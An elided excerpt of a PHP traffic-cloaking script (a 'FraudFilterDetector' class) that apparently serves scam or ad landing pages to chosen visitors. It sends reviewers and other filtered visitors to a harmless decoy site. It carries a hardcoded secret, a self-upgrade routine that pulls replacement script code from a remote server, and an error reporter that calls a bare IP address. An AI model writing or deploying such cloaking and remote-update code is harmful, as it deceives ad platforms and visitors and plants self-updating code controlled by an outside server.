...
class FraudFilterDetector_hmgqu {
    ...
    function isSignatureValid($sign, $time) {
        $str = '3e0a497c-0105-43f7-bc66-2cea99fa75b0.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.learnenglishfeelgood.com/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 3e0a497c-0105-43f7-bc66-2cea99fa75b0',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 3e0a497c-0105-43f7-bc66-2cea99fa75b0';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 3e0a497c-0105-43f7-bc66-2cea99fa75b0';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=hmgqu&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_hmgqu = new FraudFilterDetector_hmgqu();
$fraudFilterDetector_hmgqu->check();
